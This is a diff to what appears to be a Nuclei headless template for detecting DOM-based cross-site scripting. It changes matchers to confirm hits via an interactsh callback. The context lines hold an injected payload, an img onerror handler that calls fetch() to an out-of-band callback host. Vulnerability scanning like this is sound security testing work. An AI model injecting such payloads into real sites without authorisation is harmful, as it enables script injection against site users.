@@ -10,16 +10,11 @@ headless:
     type: word
     words:
     - http
-    - dns
-  - condition: or
-    name: vulnerabilities
-    part: extract
+  - part: interactsh_request
     type: word
     words:
-    - eval-overridden
-    - document-write-found
-    - location-injectable
-  matchers-condition: or
+    - '{{xss_id}}'
+  matchers-condition: and
   steps:
   - action: navigate
     args:
@@ -41,7 +36,7 @@ headless:
         \ src=x onerror=\\\"fetch('{{callback}}/innerhtml-{{xss_id}}')\\\">\";\n \
         \   // Restore to not break the page\n    setTimeout(() => { elements[i].innerHTML\
         \ = original; }, 100);\n  } catch(e) {}\n}\n"
-  - action: wait
+  - action: sleep
     args:
       duration: 2
   - action: script
